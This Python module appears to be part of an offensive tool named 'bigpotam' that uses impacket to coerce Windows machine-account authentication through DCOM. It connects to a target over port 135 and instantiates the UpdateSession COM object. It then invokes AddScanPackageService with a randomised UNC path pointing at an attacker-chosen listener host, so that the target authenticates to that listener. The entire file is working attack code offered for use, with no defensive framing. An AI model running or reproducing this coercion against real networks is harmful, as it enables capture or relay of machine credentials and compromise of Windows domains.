"""DCOM UpdateSession trigger function (machine account coercion)."""

import logging
import random
import string

from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.dcom.oaut import (
    DISPATCH_METHOD,
    DISPPARAMS,
    VARENUM,
    VARIANT,
    IDispatch,
    IID_IDispatch,
    string_to_bin,
)
from impacket.dcerpc.v5.dcomrt import (
    FLAGS_OBJREF_CUSTOM,
    FLAGS_OBJREF_EXTENDED,
    FLAGS_OBJREF_HANDLER,
    FLAGS_OBJREF_STANDARD,
    INTERFACE,
    OBJREF,
    OBJREF_CUSTOM,
    OBJREF_EXTENDED,
    OBJREF_HANDLER,
    OBJREF_STANDARD,
    DCOMConnection,
    IRemUnknown2,
)
from impacket.dcerpc.v5.dtypes import NULL

log = logging.getLogger("bigpotam")

UPDATESESSION_CLSID = "4CB43D7F-7EEE-4906-8698-60DA1C38F2FE"

_OBJREF_PARSERS = {
    FLAGS_OBJREF_CUSTOM: OBJREF_CUSTOM,
    FLAGS_OBJREF_HANDLER: OBJREF_HANDLER,
    FLAGS_OBJREF_STANDARD: OBJREF_STANDARD,
    FLAGS_OBJREF_EXTENDED: OBJREF_EXTENDED,
}


def _rnd(n: int = 4) -> str:
    return "".join(random.choices(string.ascii_letters, k=n))


def _get_interface(dispatch, data):
    """Extract IDispatch interface from variant result."""
    raw = b"".join(data)
    objref = OBJREF(raw)
    flags = objref["flags"]

    parser = _OBJREF_PARSERS.get(flags)
    if parser is not None:
        objref = parser(raw)

    return IRemUnknown2(
        INTERFACE(dispatch.get_cinstance(), objref),
    )


def _make_bstr_variant(value: str) -> VARIANT:
    """Build a VT_BSTR VARIANT for DCOM dispatch calls."""
    var = VARIANT(None, False)
    var["clSize"] = 5
    var["vt"] = VARENUM.VT_BSTR
    var["_varUnion"]["tag"] = VARENUM.VT_BSTR
    var["_varUnion"]["bstrVal"]["asData"] = value
    return var


def _dcom_disconnect(dcom) -> None:
    """Safely disconnect a DCOM session."""
    if dcom is None:
        return
    try:
        dcom.disconnect()
    except Exception:
        pass


def trigger_update_session(
    target: str,
    listener: str,
    username: str = "",
    password: str = "",
    domain: str = "",
    lmhash: str = "",
    nthash: str = "",
    do_kerberos: bool = False,
    dc_host: str | None = None,
    timeout: int = 5,
    **kw,
) -> bool:
    """DCOM UpdateSession.AddScanPackageService coercion (machine account).

    Uses DCOM over port 135, not named pipes. Connection logic is entirely
    separate from all RPC methods.
    """
    dcom = None
    try:
        # Verify port 135 is reachable
        string_binding = rf"ncacn_ip_tcp:{target}[135]"
        rpc_transport = transport.DCERPCTransportFactory(string_binding)
        rpc_transport.set_connect_timeout(timeout)
        dce = rpc_transport.get_dce_rpc()
        dce.connect()
        dce.disconnect()

        dcom = DCOMConnection(
            target,
            username,
            password,
            domain,
            lmhash,
            nthash,
            oxidResolver=True,
            doKerberos=do_kerberos,
            kdcHost=dc_host,
        )

        disp_params = DISPPARAMS(None, False)
        disp_params["rgvarg"] = NULL
        disp_params["rgdispidNamedArgs"] = NULL
        disp_params["cArgs"] = 0
        disp_params["cNamedArgs"] = 0

        i_interface = dcom.CoCreateInstanceEx(
            string_to_bin(UPDATESESSION_CLSID),
            IID_IDispatch,
        )
        i_session = IDispatch(i_interface)

        create_mgr_id = i_session.GetIDsOfNames(
            ("CreateUpdateServiceManager",),
        )[0]
        h_create_mgr = i_session.Invoke(
            create_mgr_id,
            0x409,
            DISPATCH_METHOD,
            disp_params,
            0,
            [],
            [],
        )

        i_svc_mgr = IDispatch(
            _get_interface(
                i_session,
                h_create_mgr["pVarResult"]["_varUnion"]["pdispVal"]["abData"],
            ),
        )

        add_scan_id = i_svc_mgr.GetIDsOfNames(
            ("AddScanPackageService",),
        )[0]

        # Build UNC path with random share and filename
        unc_path = f"\\\\{listener}\\{_rnd()}\\{_rnd()}.txt"

        params = DISPPARAMS(None, False)
        params["rgdispidNamedArgs"] = NULL
        params["cArgs"] = 2
        params["cNamedArgs"] = 0

        # UpdateSession: UNC path first, then service name
        params["rgvarg"].append(_make_bstr_variant(unc_path))
        params["rgvarg"].append(_make_bstr_variant("BIGPOTAM"))

        i_svc_mgr.Invoke(
            add_scan_id,
            0x409,
            DISPATCH_METHOD,
            params,
            0,
            [],
            [],
        )

        dcom.disconnect()
        return True

    except Exception as e:
        err = str(e)
        if "unknown error code: 0x0" in err:
            log.debug("DCOM UpdateSession: got expected 0x0 (success)")
            _dcom_disconnect(dcom)
            return True

        if "access_denied" in err:
            log.debug("DCOM UpdateSession: access denied")
        elif "REGDB_E_CLASSNOTREG" in err:
            log.debug("DCOM UpdateSession: class not registered")
        elif "CO_E_RUNAS_LOGON_FAILURE" in err:
            log.debug("DCOM UpdateSession: no interactive user")
        else:
            log.debug("DCOM UpdateSession: %s", e)

        _dcom_disconnect(dcom)
        return False
